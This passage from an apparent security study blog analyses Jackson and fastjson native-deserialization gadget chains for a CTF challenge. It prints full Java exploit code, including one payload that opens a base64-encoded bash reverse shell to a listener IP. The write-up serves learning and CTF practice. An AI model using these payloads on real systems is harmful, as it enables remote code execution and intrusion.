alt="image-20241013011745786"></p><h2 id="pojonode"><a href="#POJONode" class="headerlink" title="POJONode"></a>POJONode</h2><p>前面说的都是序列化的getter，和反序列化有什么关系呢，在Jackson的原生反序列化中，利用的是POJONode的toString方法来触发对应类对象的getter方法，我们先来分析一下</p><blockquote><p>这里测得时候发现离谱的地方，测试出来Jackson应该是在2.10.x才把toString去掉改到父类去的，在2.9.x以及之前，POJONode自己本身是有toString方法的，而他的父类BaseJsonNode反而是没有实现toString的，这样就不能进行利用了</p><p><img src="https://cdn.clown2024.cn/202410131258198.png" alt="image-20241013125810157"></p></blockquote><p>他POJONode本身是没有toString的，是到父类BaseJsonNode才有实现，继承关系如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">POJONode --&gt; ValueNode --&gt; BaseJsonNode<br></code></pre></td></tr></table></figure><p>BaseJsonNode#toString</p><p><img src="https://cdn.clown2024.cn/202410130142098.png" alt="image-20241013014250059"></p><p>这里调用了一个InternalNodeMapper.nodeToString方法</p><p><img src="https://cdn.clown2024.cn/202410130143214.png" alt="image-20241013014346177"></p><p>欸是不是看到了一个熟悉的东西，writeValueAsString，这里也就是触发getter方法的地方，也就是漏洞触发点</p><p>所以调用链就是这样的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">BaseJsonNode#toString -&gt; InternalNodeMapper#nodeToString -&gt; ObjectWriter.writeValueAsString<br></code></pre></td></tr></table></figure><p>能调用getter方法就可以打链子了，比如打TemplatesImpl</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>触发toString自然就选择我们常用的BadAttributeValueExpException了</p><p>链子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">BadAttributeValueExpException#readObject -&gt; POJONode#toString -&gt; BaseJsonNode#toString -&gt; InternalNodeMapper#nodeToString -&gt; ObjectWriter.writeValueAsString<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.attack;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">attack_usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-comment">//生成恶意类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonNodes);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410131232076.png" alt="image-20241013123218942"></p><p>这是会发现我们在序列化的时候出错了</p><p>根据错误先去看ObjectOuptputStream#writeObject0方法</p><p><img src="https://cdn.clown2024.cn/202410131234990.png" alt="image-20241013123431941"></p><p>可以看到这里会判断序列化类是否实现了writeReplace方法，实现了则会进行调用，而在BaseJsonNode中实现了该方法，在该方法调用的时候抛出了异常</p><p><img src="https://cdn.clown2024.cn/202410131237369.png" alt="image-20241013123712324"></p><p>文章中直接将该方法注释或删去就正常了，我勒个简单粗暴啊😢</p><p>这里需要重写一下jar包，之前没写过顺便记录一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.找到你所要重写的方法的所在类，查看其中的路径；<br><br>2.在我们的src目录下新建一个同包名同类名的类；<br><br>3.将jar包中的重写方法所在类的所有代码复制到我们新建的同包名同类名的类中；<br><br>4.在我们新建的同包名同类名的类中修改对应的方法中的代码<br><br>原理：<br>编译输出的时候会优先使用我们src下面的类，而不是优先使用Jar包里面的类，这样就达到了覆盖jar包方法的目的<br></code></pre></td></tr></table></figure><p>参考文章：<a href="https://blog.csdn.net/qq_41512902/article/details/125558275">https://blog.csdn.net/qq_41512902/article/details/125558275</a></p><p>最后改成这样就行了</p><p><img src="https://cdn.clown2024.cn/202410131251160.png" alt="image-20241013125145111"></p><p>再去打一遍exp试试</p><p><img src="https://cdn.clown2024.cn/202410131252817.png" alt="image-20241013125207733"></p><p>现在就能正常弹计算器了</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>这里就那阿里云ctf的一道题来作为例子</p><p>题目附件：<a href="https://github.com/Drun1baby/CTF-Repo-2023/tree/main/2023/%E9%98%BF%E9%87%8C%E4%BA%91CTF/web/bypassit1">https://github.com/Drun1baby/CTF-Repo-2023/tree/main/2023/%E9%98%BF%E9%87%8C%E4%BA%91CTF/web/bypassit1</a></p><p>反编译下jar包</p><p><img src="https://cdn.clown2024.cn/202410131311887.png" alt="image-20241013131145827"></p><p>就几行代码，直接读取数据反序列化</p><p>看了一下依赖就只有springboot，那肯定是打jackson了，springboot依赖默认用jackson，而且都放到这当例题了</p><p>那就可以用前面的exp打一个Jackson原生反序列化，这里还要考虑一个问题就是payload的发送，因为这里没有base64解码直接copy过去会出错，我这里直接用java发请求过去</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.attack;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">attack_usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-comment">//生成恶意类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjEuMjguMjQ3Lzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonNodes);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">byte</span>[] byteArray = barr.toByteArray();<br>        System.out.println(byteArray);<br><br>        <span class="hljs-comment">//发送Post请求</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://localhost:8080/bypassit&quot;</span>);<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        conn.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>        conn.setDoOutput(<span class="hljs-literal">true</span>);<br>        conn.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>);<br>        conn.getOutputStream().write(byteArray);<br>        conn.getOutputStream().flush();<br><br>        <span class="hljs-comment">// 读取响应</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> conn.getResponseCode();<br>        System.out.println(<span class="hljs-string">&quot;Response Code: &quot;</span> + responseCode);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>记得要删除writeReplace方法</p></blockquote><p>反弹shell过来即可</p><p><img src="https://cdn.clown2024.cn/202410140030909.png" alt="image-20241014003050846"></p><p>或者直接序列化存入文件，然后用python发请求</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;&quot;</span><br>data=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<br>res=requests.post(url,data=data)<br></code></pre></td></tr></table></figure><h1 id="其他链子"><a href="#其他链子" class="headerlink" title="其他链子"></a>其他链子</h1><p>比如Templates被ban的情况下用SignObject打二次反序列化，可以看这篇文章：<a href="https://xz.aliyun.com/t/12966?time__1311=GqGxuD9QLxlr=iQGkDRQI23Ezabx&u_atoken=8440f6b703af0eb6335929f9798f602f&u_asig=ac11000117287520205018812e007f#toc-34">https://xz.aliyun.com/t/12966?time__1311=GqGxuD9QLxlr%3DiQGkDRQI23Ezabx&amp;u_atoken=8440f6b703af0eb6335929f9798f602f&amp;u_asig=ac11000117287520205018812e007f#toc-34</a></p><p>还有其余的就在做题时遇到再学吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考文章：&lt;a href=&quot;https://xz.aliyun.com/t/12509?u_atoken=0f8fa2b10f046b73ed286030e1ee9f9e&amp;u_asig=1a0c381017287414696367848e00f7&quot;&gt;https://xz.a</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="反序列化" scheme="https://clowsman.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>fastjson原生反序列化</title>
    <link href="https://clowsman.github.io/2024/10/11/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/10/11/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-10-11T04:15:15.000Z</published>
    <updated>2024-10-11T09:21:33.257Z</updated>
    
    <content type="html"><![CDATA[<p>看了fastjson的各版本链子，再看一下fastjson的原生反序列化，看的是y4师傅的两篇文章</p><p><a href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p><a href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/</a></p><p>来简单的学习复现一下</p><h1 id="利用限制"><a href="#利用限制" class="headerlink" title="利用限制"></a>利用限制</h1><p>Fastjson1版本小于等于1.2.48(不过1.2.49之后也有绕过方法，这里指的是直接用不需要绕过的)</p><p>Fastjson2&lt;&#x3D;2.0.26(我自己测试刚好在文章版本的下一个版本2.0.27开始就不行了)</p><h1 id="找链子"><a href="#找链子" class="headerlink" title="找链子"></a>找链子</h1><p>要用原生反序列化，就需要寻找fastjson中继承了Serializable接口的类，fastjson里面有两个这样的类：JSONArray与JSONObject</p><p>这两个类的利用方式差不多，这里用JSONArray这个类</p><p>这两个本身是没有实现readObject方法的，所以是通过其他类的readObject来触发JSONArray与JSONObject中的某个方法来形成链子。</p><p>文章中的就是利用JSON的toString方法触发JSON的toJsonString的调用</p><p><img src="https://cdn.clown2024.cn/202410111309567.png" alt="image-20241011130936507"></p><p>这和JSONObject以及JSONArray有什么关系呢，我去看了源码，JSONArray和JSONObject是JSON的子类，他们本身是没有toString方法的，所以会调用到其父类JSON的toString方法</p><p>那为什么要触发toString呢，因为JSONObject和JSONArray在触发toString方法的时候会调用get方法，欸那就可以用来将我们的链子封装在里面来触发了</p><p>get触发例子</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Student构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">// JSONObject调用toString</span><br>        HashMap&lt;String,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;clown&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">org</span>.clown.Test1.Student());<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(hashMap);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">string</span> <span class="hljs-operator">=</span> jsonObject.toString();<br>        System.out.println(<span class="hljs-string">&quot;-----------------------&quot;</span>);<br><br>        <span class="hljs-comment">// JSONArray调用toString</span><br>        ArrayList&lt;Object&gt; arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>());<br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(arrayList);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">string1</span> <span class="hljs-operator">=</span> objects.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111324454.png" alt="image-20241011132452413"></p><p>至于为什么toString会调用getter方法就看文章的分析了解一下就好了</p><h1 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h1><p>能触发getter方法就很容易想到通过触发TemplatesImpl的getOutputProperties方法实现加载任意字节码最终触发恶意方法调用</p><p>然后触发toString方法我们可以利用BadAttributeValueExpException来触发，该类在cc和rome链都有用到</p><p>那么链子我们就可以写出来了，这里用javassist动态生成恶意类</p><p><strong>利用依赖</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.48<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><strong>利用链</strong></p><p>fastjson1的利用</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//生成恶意类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span 